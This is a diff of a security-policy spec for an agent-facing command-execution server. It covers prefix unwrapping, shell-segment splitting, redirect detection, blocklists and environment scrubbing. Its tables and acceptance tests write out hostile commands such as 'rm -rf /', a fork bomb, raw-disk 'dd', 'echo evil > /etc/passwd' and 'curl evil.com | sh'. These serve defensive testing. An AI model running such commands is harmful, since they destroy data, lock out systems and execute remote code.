@@ -2,13 +2,16 @@
 
 ## Goal
 
-Enforce a security policy for every command execution and filesystem operation before it reaches the executor. Provide deterministic allow/deny decisions based on `Config` allowlist, denylist, path restrictions, a hardcoded destructive-command block, and a CWD-based approval gate.
+Enforce a security policy for every command execution and filesystem operation **before** it reaches the executor. Provide deterministic allow/deny decisions based on `Config` allowlist, denylist, path restrictions, a hardcoded destructive-command block, and a CWD-based approval gate. **Defeat trivial bypass tricks** like `sudo`, `bash -c`, `xargs`, `env`, `nohup`, and `timeout` wrappers.
 
 ---
 
 ## Scope
 
 - Validate shell commands against `allowed_commands`, `blocked_commands`, `HARDCODED_BLOCKED_COMMANDS`, and `DESTRUCTIVE_PATTERNS`.
+- **Recursively unwrap "executor-style" prefixes** (`sudo`, `doas`, `pkexec`, `bash -c`, `sh -c`, `env`, `nohup`, `timeout`, `xargs`, `setsid`) so each underlying command is independently checked.
+- **Expand shell pipelines / chains** when `shell=True`: split on `;`, `&&`, `||`, `|`, `&` and check every segment.
+- Detect **shell redirections** (`>`, `>>`, `<>`, `>|`, `<<`, `<<<`) targeting the filesystem and treat them as write operations requiring approval.
 - Validate file paths against `allowed_paths` (hard block) and `server_cwd` (soft approval gate).
 - Require explicit user approval (`approve=True`) for write operations and for any access outside `server_cwd`.
 - No I/O, no side effects in pure check functions.
@@ -21,8 +24,12 @@ Enforce a security policy for every command execution and filesystem operation b
 class PolicyDenied(Exception):
     """Raised when a command or path is rejected by policy (hard block)."""
 
-def check_command(command: str, config: Config) -> None:
-    """Raise PolicyDenied(reason) if the command is not permitted."""
+def check_command(command: str, config: Config, use_shell: bool = False) -> None:
+    """Raise PolicyDenied(reason) if the command is not permitted.
+
+    When use_shell=True the input is split on shell separators and each
+    segment is individually validated. When False, the input is treated
+    as a single argv (still unwrapped through executor prefixes)."""
 
 def check_path(path: str, config: Config) -> None:
     """Raise PolicyDenied(reason) if the path is outside allowed_paths."""
@@ -30,139 +37,197 @@ def check_path(path: str, config: Config) -> None:
 def _is_outside_cwd(path: str, server_cwd: str) -> bool:
     """Return True if the resolved path is NOT under server_cwd.
     Returns False when server_cwd is '/' (unrestricted sentinel)."""
+
+def parse_argv(command: str) -> List[str]:
+    """shlex.split the command; on parse error, return [] (caller handles)."""
+
+def unwrap_executor_prefixes(argv: List[str]) -> List[str]:
+    """Strip executor-style prefixes (sudo, env, bash -c …) and return the
+    inner argv to actually validate. May be applied repeatedly until idempotent."""
+
+def split_shell_segments(command: str) -> List[str]:
+    """Split a shell-mode command on ; && || | & into trimmed sub-commands."""
+
+def detect_write_redirect(command: str) -> Optional[str]:
+    """Return the target path if the shell-mode command performs a writing
+    redirect (>, >>, >|, <>) to a regular file path; otherwise None."""
 ```
 
 ---
 
 ## Config: `server_cwd` field
 
-`Config` gains a new non-configurable field:
-
-```python
-server_cwd: str  # os.getcwd() captured at server start; not settable via env
-```
-
-- Set to `os.getcwd()` in `load_config()`.
-- Acts as the **soft security boundary**: paths outside it require user approval.
-- `"/"` is a special sentinel meaning no CWD restriction (used in tests).
+`Config` gains a non-configurable field set to `os.getcwd()` at startup; `"/"` is a special sentinel meaning no CWD restriction (used in tests).
 
 ---
 
-## Command Check Logic
+## Command Check Logic (single segment / argv)
 
 ```
-1. Strip the command string.
-2. If empty -> raise PolicyDenied("empty command").
-3. Extract base_token: first whitespace-delimited token.
-4. Derive basename: os.path.basename(base_token).
-5. Check HARDCODED_BLOCKED_COMMANDS first (base_token OR basename exact match):
-   - If matched -> raise PolicyDenied (cannot be overridden by config).
-6. Check DESTRUCTIVE_PATTERNS against the full command string:
-   - If any pattern matches -> raise PolicyDenied with the pattern description.
-7. Check config.blocked_commands (exact match on base_token OR basename):
-   - If matched -> raise PolicyDenied.
-8. Check allowlist:
-   - If allowed_commands == ['*'] -> allow (return).
-   - If base_token or basename matches -> allow (return).
-   - Otherwise -> raise PolicyDenied.
+1. Strip the command string. Empty -> PolicyDenied("empty command").
+2. Try shlex.split. On parse error -> PolicyDenied("malformed command: …").
+3. Recursively unwrap_executor_prefixes(argv). The "checked argv" is the unwrapped one.
+   - If unwrap leaves an empty argv (e.g. `sudo` with no following command)
+     -> PolicyDenied("missing command after <prefix>").
+4. base_token = checked_argv[0]; basename = os.path.basename(base_token).
+5. Hardcoded block (base_token OR basename in HARDCODED_BLOCKED_COMMANDS) -> PolicyDenied
+   (cannot be overridden by config).
+6. Destructive patterns scanned against the FULL ORIGINAL command string
+   (so wrapping with sudo/etc still triggers patterns like `rm -rf /`).
+   Match -> PolicyDenied with the pattern description.
+7. config.blocked_commands (exact match on base_token OR basename) -> PolicyDenied.
+8. Allowlist:
+   - allowed_commands == ["*"] -> allow.
+   - base_token or basename matches -> allow.
+   - Otherwise -> PolicyDenied.
 ```
+
+## Command Check Logic (shell mode)
+
+When the executor is invoked with `shell=True`, the caller passes `use_shell=True` to `check_command`:
+
+```
+1. segments = split_shell_segments(command).
+2. For each segment, run the single-segment check above.
+3. Additionally:
+   - If detect_write_redirect(command) returns a path, mark the call as
+     requiring approval (handler-level decision, not PolicyDenied).
+```
+
+`split_shell_segments` strips quoted strings before splitting so that
+`echo "a; b"` is one segment, not two.
 
 ---
 
-## Hardcoded Blocked Commands
+## Executor Prefix Unwrapping
 
-`HARDCODED_BLOCKED_COMMANDS` is a module-level `frozenset[str]` that cannot be changed via config:
+The following prefixes are recognised and stripped to expose the inner command:
+
+| Prefix | Notes |
+|---|---|
+| `sudo`, `doas`, `pkexec` | Drops the prefix and any preceding `-u user`, `-E`, `-H`, `--` flags. |
+| `env` | Drops `env` and any leading `KEY=VAL` assignments and `-i`/`-u VAR` flags. |
+| `nohup`, `setsid` | Drops the prefix only. |
+| `timeout`, `gtimeout` | Drops the prefix and the duration argument (e.g. `timeout 5 cmd`). |
+| `bash -c "cmd"`, `sh -c "cmd"`, `zsh -c "cmd"` | Replace argv with `parse_argv("cmd")` (recursive). |
+| `xargs` | Drops `xargs` and any flags up to the first non-flag token, which becomes the inner command. |
+
+Unwrapping is applied repeatedly until idempotent (capped at 8 iterations to prevent pathological inputs from looping).
+
+If unwrapping produces an inner argv whose `argv[0]` is itself a known prefix again, recursion continues. If the inner-most argv is empty -> PolicyDenied.
+
+**Why**: Without unwrapping, `bash -c 'shutdown -h now'` and `sudo mkfs.ext4 /dev/sda1` defeat both the hardcoded blocklist and any allow/deny configuration.
+
+---
+
+## Hardcoded Blocked Commands (expanded)
+
+`HARDCODED_BLOCKED_COMMANDS` is a module-level `frozenset[str]` that cannot be changed via config. The list is **explicitly broadened** for v2:
 
 ```
 Filesystem formatting/wiping:
-  mkfs, mkfs.ext2, mkfs.ext3, mkfs.ext4, mkfs.xfs, mkfs.btrfs,
-  mkfs.fat, mkfs.ntfs, mkfs.vfat, mkfs.f2fs, wipefs
+  mkfs and all common variants (.ext2/3/4, .xfs, .btrfs, .fat, .ntfs, .vfat, .f2fs),
+  wipefs, shred
 
-Partition management:
-  fdisk, parted, gdisk, sgdisk, sfdisk, cfdisk
-
-Secure delete:
-  shred
-
-System power/init:
-  shutdown, reboot, poweroff, halt
-
-LVM/storage management:
+Partition / LVM:
+  fdisk, parted, gdisk, sgdisk, sfdisk, cfdisk,
   lvremove, vgremove, pvremove
+
+Power / init / kernel-swap:
+  shutdown, reboot, poweroff, halt,
+  kexec, init, telinit
+
+Kernel modules:
+  insmod, rmmod, modprobe       # modprobe -r is the dangerous form;
+                                # any modprobe call is rejected here.
+
+Mount / chroot / namespace:
+  mount, umount, pivot_root, chroot, nsenter, unshare, losetup, swapoff
+
+LSM disable:
+  setenforce, aa-disable, apparmor_parser
+
+User / authentication:
+  userdel, groupdel, passwd, chpasswd, usermod, gpasswd, vipw, vigr
+
+Cron / scheduled tasks:
+  crontab, at, batch
+
+Container privileged:
+  Note: docker/podman themselves are NOT in the hardcoded list (read-only
+  inspection commands are useful), but the destructive patterns block
+  `docker run --privileged`, `docker exec --privileged`, etc.
 ```
+
+Adding a command here is a **breaking** change for callers; document additions in spec changelog.
 
 ---
 
-## Destructive Patterns
+## Destructive Patterns (expanded)
 
-`DESTRUCTIVE_PATTERNS` is a module-level `List[Tuple[re.Pattern[str], str]]` checked against the **full command string**. These are defense-in-depth (not a cryptographic boundary; creative wrapping may bypass regex). Each entry is `(compiled_pattern, human_description)`:
+`DESTRUCTIVE_PATTERNS` is `List[Tuple[Pattern, str]]` checked against the **full command string** (post-quote-stripped form). Defense-in-depth, not a hard boundary. Highlights:
 
-| Pattern intent | Example match |
+| Intent | Example |
 |---|---|
 | `rm -r` on root `/` | `rm -rf /` |
 | `rm -r` on root glob `/*` | `rm -rf /*` |
 | `rm -r` on home `~` | `rm -rf ~/` |
 | `dd` writing to raw device | `dd if=/dev/zero of=/dev/sda` |
 | Fork bomb | `:(){ :|:& };:` |
-| `chmod` removing all permissions on `/` | `chmod -R 000 /` |
-| Kill all processes | `kill -9 -1` |
-| Overwriting critical system files | `> /etc/passwd` |
+| Kill all processes | `kill -9 -1`, `killall5`, `pkill -9 -1` |
+| Overwrite `/etc/passwd`/`shadow`/`sudoers`/`hosts` | `> /etc/passwd` |
+| Network self-lockout | `iptables -F`, `nft flush ruleset`, `ufw disable` |
+| SSH self-lockout | `systemctl stop sshd`, `service ssh stop` |
+| History wipe | `history -c`, `truncate -s 0 /var/log/*`, `journalctl --vacuum-time=` |
+| Privileged docker | `docker run --privileged`, `docker exec --privileged` |
+| Force-push / hard reset / clean -fdx | `git push --force`, `git reset --hard`, `git clean -fdx` |
+| Remote-code-execute through pipe | `curl … \| sh`, `wget … \| bash`, `curl … \| python` |
+
+The full table is the source of truth in `server.py`.
+
+---
+
+## Write Redirect Detection (new)
+
+`detect_write_redirect(command)` analyses a `shell=True` command for redirection operators that **write** to the filesystem. It must:
+
+- Skip operators inside single/double quotes and after a backslash.
+- Skip stdin redirections (`<`, `<<`, `<<<`).
+- Recognise `>`, `>>`, `>|`, `<>` and `&>` / `&>>`.
+- Recognise file-descriptor variants (`2>`, `2>>`, `1>`).
+- Return the **first** write target (relative or absolute path) it finds; return `None` when none is detected.
+- Treat redirects to `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty` as **non-writes** (they don't mutate the filesystem).
+- Targets that look like FD references (`>&2`, `>&-`) are **not** writes.
+
+Tool handlers must apply approval (same UX as `WRITE_COMMANDS`) when a write redirect is detected and `approve != True`.
 
 ---
 
 ## Path Check Logic (Hard Block)
 
-```
-1. Resolve to absolute path: os.path.realpath(path).
-2. For each prefix in allowed_paths:
-   - If resolved path starts with prefix -> allow (return).
-3. If no prefix matched -> raise PolicyDenied.
-```
-
-Special case: `allowed_paths == ['/']` allows any absolute path.
+Unchanged — resolve via `os.path.realpath`; allow if any prefix in `allowed_paths` matches, otherwise raise. `["/"]` allows any path.
 
 ---
 
 ## CWD-Based Approval Gate (Soft Block)
 
-Tool handlers apply an additional check **after** `check_path` passes:
-
-```
-if _is_outside_cwd(resolved_path, config.server_cwd) and not approve:
-    return _approval_required_response(reason)
-```
-
-`_is_outside_cwd(path, server_cwd)`:
-- Returns `False` when `server_cwd == "/"` (no restriction).
-- Returns `False` when `realpath(path)` is exactly `server_cwd` or starts with `server_cwd + os.sep`.
-- Returns `True` otherwise.
+Unchanged — paths outside `server_cwd` require `approve=True`.
 
 ---
 
 ## Approval Mechanism
 
-All four tool handlers accept an `approve: boolean` parameter (default `false`).
-
-When approval is required but `approve` is `false`, the handler returns:
-```python
-{
-  "content": [{"type": "text", "text": "⚠️  Approval required: <reason>\n\nTo proceed, re-call with \"approve\": true"}],
-  "isError": True
-}
-```
-
-Audit outcome for these responses: `"approval_required"`.
-
-**Design note:** `approve=true` is a UX friction mechanism — it forces the calling agent to receive a clear "approval required" signal and then explicitly re-issue the call. In human-in-the-loop agent setups (e.g., Claude Desktop, Cursor), both the initial denial and the re-call with `approve=true` are surfaced to the user, creating a natural review checkpoint. This is not a cryptographic access control; a determined automated caller can bypass it by setting `approve=true` on the first attempt.
+All five tool handlers (existing 4 + new `search_files`) accept an `approve: boolean` parameter. The error response format is unchanged.
 
 ### Per-tool approval rules
 
 | Tool | Triggers approval |
 |---|---|
-| `read_file` | path is outside `server_cwd` |
-| `write_file` | **always** (write ops always require approval); also if outside `server_cwd` |
-| `list_directory` | path is outside `server_cwd` |
-| `execute_command` | effective cwd (`cwd` param or `config.default_cwd`) is outside `server_cwd`; **or** the base command is a known write/modify/delete operation (see `WRITE_COMMANDS`) |
+| `read_file` | path outside `server_cwd` |
+| `write_file` | always; also if outside `server_cwd` |
+| `list_directory` | path outside `server_cwd` |
+| `search_files` | path outside `server_cwd` |
+| `execute_command` | effective cwd outside `server_cwd`; **or** any segment's base command is in `WRITE_COMMANDS`; **or** a write redirect is detected (shell mode) |
 
 `approve=true` satisfies **all** approval requirements for a single call.
 
@@ -170,82 +235,104 @@ Audit outcome for these responses: `"approval_required"`.
 
 ## Write Commands (`WRITE_COMMANDS`)
 
-`WRITE_COMMANDS` is a module-level `frozenset[str]` of command basenames that modify the filesystem. When `execute_command` is called and the base command matches, `approve=true` is required.
+Unchanged set of basenames (`rm`, `cp`, `mv`, `chmod`, `chown`, `tar`, `wget`, `curl` …). Now the check runs against the **unwrapped** argv: `sudo cp src dst` triggers approval just like plain `cp src dst`.
+
+When `shell=True`, the check runs on **every** segment — `ls && cp a b` triggers approval because of the `cp` segment.
+
+Shell redirections are now covered by `detect_write_redirect` and no longer count as a "known gap".
+
+---
+
+## HTTP Transport Hardening (Streamable HTTP migration)
+
+These checks live at the HTTP request boundary (spec 07) but are listed here so the security story is in one place.
+
+| Check | Status | Why it matters after the SSE→HTTP migration |
+|---|---|---|
+| Constant-time `Authorization` comparison | unchanged | `hmac.compare_digest` for `Bearer <API_KEY>`. |
+| `Content-Length` cap | unchanged | Pre-read size check prevents memory/bandwidth DoS. |
+| Reject `Transfer-Encoding: chunked` | **NEW** | `BaseHTTPRequestHandler` doesn't decode chunked bodies. Without an explicit reject, a hostile client could send `Content-Length: 0` + chunked body, which we'd treat as 0 bytes — a request-smuggling foothold if a future reverse proxy reassembles differently. We refuse with `400 Bad Request`. |
+| `Mcp-Session-Id` validation | **NEW** | Sessions are issued at `initialize` and tracked in an in-memory set capped at 256 entries (oldest-evicted FIFO). Requests with an unknown session ID return `404`; requests with no session header are accepted (permissive — our security boundary is `API_KEY`). |
+| Endpoint allowlist | **NEW** | Only `/mcp` is recognised; all other paths → `404`. Eliminates accidental fingerprinting via legacy `/sse`, `/message`, etc. |
+| Method allowlist | **NEW** | Only `POST/GET/DELETE/OPTIONS` on `/mcp`; everything else falls through to BaseHTTPRequestHandler's default 501. |
+| Fail-closed bind | unchanged | `HTTP_HOST` non-loopback + `API_KEY` empty → `ConfigError` before bind. |
+
+DNS rebinding / `Origin` validation is **explicitly out of scope** — this server is designed to be reached by AI agents on remote hosts, not by browser tabs. Operators who want browser-based clients SHOULD put mario behind a reverse proxy that performs Origin pinning.
+
+---
+
+## Subprocess Environment Scrubbing (new)
+
+The executor (Section 3) MUST NOT inherit the parent process's full env when spawning a subprocess. Instead, it filters via:
 
 ```
-File deletion / movement:
-  rm, rmdir, mv, unlink
-
-File creation / modification:
-  cp, touch, tee, truncate, install, patch
-
-Permission / ownership changes:
-  chmod, chown, chgrp
-
-Link creation:
-  ln
-
-Archive extraction (writes files):
-  tar, unzip, gunzip, bunzip2, unxz
-
-File transfer (writes to local filesystem):
-  rsync, scp, wget, curl
+SAFE_ENV_KEYS = {"PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "TZ", "USER",
+                 "LOGNAME", "SHELL", "TERM", "PWD"}
+SECRET_KEY_PATTERN = re.compile(r"(KEY|TOKEN|SECRET|PASS|CRED)", re.IGNORECASE)
 ```
 
-**Limitations (by design):** Shell redirections (`echo foo > file`, `printf >> file`) and pipelines that write files are not detected because the write is performed by the shell, not by the base command. `shell=True` commands with redirections remain the caller's responsibility. This is documented as a known gap.
+Rules:
+1. Start with an empty env dict.
+2. Copy keys from `os.environ` that are in `SAFE_ENV_KEYS`.
+3. Additionally copy keys that do not match `SECRET_KEY_PATTERN` **and** are listed in `EXTRA_ENV_PASSTHROUGH` (env var, comma-separated; default empty) — opt-in passthrough for ops who need e.g. `KUBECONFIG`.
+4. Always drop: `API_KEY`, anything matching `SECRET_KEY_PATTERN`, `AWS_*`, `GITHUB_TOKEN`, `OPENAI_*`, `ANTHROPIC_*`.
+
+This prevents `execute_command` running `env` or `printenv` from leaking the server's own `API_KEY` or surrounding cloud credentials.
 
 ---
 
 ## Default Path for `list_directory` and `read_file`
 
-When the `path` parameter is **absent or empty**, tool handlers must default to `config.server_cwd`, not to `os.getcwd()` (the Python process CWD). This ensures that "list the current directory" always resolves to the server's working directory, not to an unrelated process CWD (e.g. `/root`).
-
-- `list_directory` with no `path` → lists `config.server_cwd`.
-- `read_file` with no `path` → should return an error (path is required); no default applies.
-
-Implementation: in `handle_list_directory`, replace `str(Path(path_str).resolve())` with:
-```python
-resolved = str(Path(path_str).resolve()) if path_str else config.server_cwd
-```
+Unchanged — empty/absent path defaults to `config.server_cwd`.
 
 ---
 
-## Edge Cases
+## Edge Cases (additional)
 
-- Empty command -> `PolicyDenied("empty command")`.
-- `/usr/bin/rm` -> basename match: denylist entry `rm` blocks it.
-- `rm -rf /` with `allowed_commands=["*"]` -> DESTRUCTIVE_PATTERNS block it.
-- `mkfs.ext4 /dev/sda1` -> HARDCODED_BLOCKED_COMMANDS match on basename `mkfs.ext4`.
-- Relative paths resolved via `os.path.realpath()` (resolves `..` and symlinks).
-- `../../../etc/passwd` -> resolved absolute path falls outside allowed_paths -> PolicyDenied.
-- `server_cwd="/"` -> `_is_outside_cwd` always returns `False` (no approval gate active).
-- `list_directory` with no `path` → resolves to `server_cwd`, not to the Python process CWD.
+- `sudo -E -u root bash -c 'shutdown -h now'` -> after unwrap argv == `["shutdown","-h","now"]` -> hardcoded block.
+- `nohup poweroff &` (shell mode) -> single segment `"nohup poweroff "`, unwrapped to `poweroff`, hardcoded block.
+- `bash -c "rm -rf / ; echo done"` -> shell-mode segments are split AFTER unwrap; pattern check on the inner command catches `rm -rf /`.
+- `echo evil > /etc/passwd` (shell mode) -> destructive pattern hits.
+- `cat /tmp/x > /tmp/y` (shell mode) -> not destructive but redirect detected -> approval required.
+- `cat /tmp/x > /dev/null` -> redirect target `/dev/null` -> NO approval required.
+- `xargs rm` (shell mode, common in pipelines) -> unwrap to `rm` -> WRITE_COMMANDS approval.
+- Argv parse failure (unbalanced quotes) -> `PolicyDenied("malformed command")`.
 
 ---
 
 ## Acceptance Criteria
 
-- [ ] `check_command` raises nothing when command is in allowlist and not in any denylist.
-- [ ] `check_command` raises `PolicyDenied` when command is in `config.blocked_commands`, even if allowlist is `['*']`.
-- [ ] `check_command` raises `PolicyDenied` when command not in allowlist.
-- [ ] `check_command` raises `PolicyDenied` for empty command.
-- [ ] `check_command` raises `PolicyDenied` for any command in `HARDCODED_BLOCKED_COMMANDS`, even if allowlist is `['*']` and `blocked_commands` is empty.
-- [ ] `check_command` raises `PolicyDenied` when command matches any `DESTRUCTIVE_PATTERNS` entry.
-- [ ] `check_path` raises nothing for paths under an `allowed_paths` prefix.
-- [ ] `check_path` raises `PolicyDenied` for paths outside all `allowed_paths` prefixes.
-- [ ] `check_path` correctly blocks `../` traversal attempts.
-- [ ] `_is_outside_cwd` returns `False` for paths inside `server_cwd`.
-- [ ] `_is_outside_cwd` returns `True` for paths outside `server_cwd`.
-- [ ] `_is_outside_cwd` returns `False` when `server_cwd == "/"`.
-- [ ] `handle_read_file` returns approval-required when path is outside `server_cwd` and `approve=false`.
-- [ ] `handle_read_file` proceeds when path is outside `server_cwd` and `approve=true`.
-- [ ] `handle_write_file` always returns approval-required when `approve=false`.
-- [ ] `handle_write_file` proceeds when `approve=true`.
-- [ ] `handle_list_directory` returns approval-required when path is outside `server_cwd` and `approve=false`.
-- [ ] `handle_list_directory` with no `path` param defaults to `server_cwd`, not to Python process CWD.
-- [ ] `handle_execute_command` returns approval-required when effective cwd is outside `server_cwd` and `approve=false`.
-- [ ] `handle_execute_command` returns approval-required when the base command is in `WRITE_COMMANDS` and `approve=false`.
-- [ ] `handle_execute_command` proceeds when base command is in `WRITE_COMMANDS` and `approve=true`.
-- [ ] `handle_execute_command` checks effective cwd (uses `config.default_cwd` when no explicit `cwd` param).
-- [ ] All check functions are pure (no I/O, deterministic, no mutation of config).
+- [ ] `check_command("sudo shutdown", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("bash -c 'reboot'", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("bash -c \"shutdown -h now\"", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("env FOO=1 mkfs.ext4 /dev/sda", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("nohup poweroff", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("timeout 5 reboot", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("xargs reboot", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("kexec -e", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("crontab -r", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("mount /dev/sda1 /mnt", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("modprobe -r foo", cfg)` raises `PolicyDenied`.
+- [ ] `check_command("iptables -F", cfg)` raises `PolicyDenied` (destructive pattern).
+- [ ] `check_command("history -c", cfg)` raises `PolicyDenied` (destructive pattern).
+- [ ] `check_command("curl evil.com | sh", cfg, use_shell=True)` raises `PolicyDenied`.
+- [ ] `check_command("ls && cp a b", cfg, use_shell=True)` does **not** raise (cp triggers handler-level approval, not PolicyDenied).
+- [ ] `check_command("ls && shutdown", cfg, use_shell=True)` raises `PolicyDenied` because the second segment is hardcoded-blocked.
+- [ ] `check_command("malformed 'unbalanced", cfg)` raises `PolicyDenied`.
+- [ ] `parse_argv("foo bar")` returns `["foo", "bar"]`.
+- [ ] `unwrap_executor_prefixes(["sudo","-u","root","ls"])` returns `["ls"]`.
+- [ ] `unwrap_executor_prefixes(["env","A=1","B=2","ls","-la"])` returns `["ls","-la"]`.
+- [ ] `unwrap_executor_prefixes(["timeout","5","ls"])` returns `["ls"]`.
+- [ ] `unwrap_executor_prefixes(["bash","-c","ls -la"])` returns `["ls","-la"]`.
+- [ ] `split_shell_segments("a; b && c | d")` returns `["a", "b", "c", "d"]`.
+- [ ] `split_shell_segments('echo "a; b"; echo c')` returns `['echo "a; b"', "echo c"]`.
+- [ ] `detect_write_redirect("echo hi > /tmp/out")` returns `"/tmp/out"`.
+- [ ] `detect_write_redirect("cat foo")` returns `None`.
+- [ ] `detect_write_redirect("echo hi > /dev/null")` returns `None`.
+- [ ] `detect_write_redirect("echo \"hi > x\"")` returns `None` (operator is quoted).
+- [ ] `detect_write_redirect("cmd 2>&1")` returns `None` (FD redirect, not file).
+- [ ] `handle_execute_command` with `shell=True` and `command="echo evil > /etc/passwd"` returns denied (destructive pattern).
+- [ ] `handle_execute_command` with `shell=True` and `command="echo data > /tmp/safe.log"` returns approval-required when no `approve`, succeeds with `approve=True`.
+- [ ] Subprocess env does NOT contain `API_KEY` after the executor scrubs env.
+- [ ] All previous v1 acceptance criteria still pass.
 - [ ] `mypy server.py` passes.
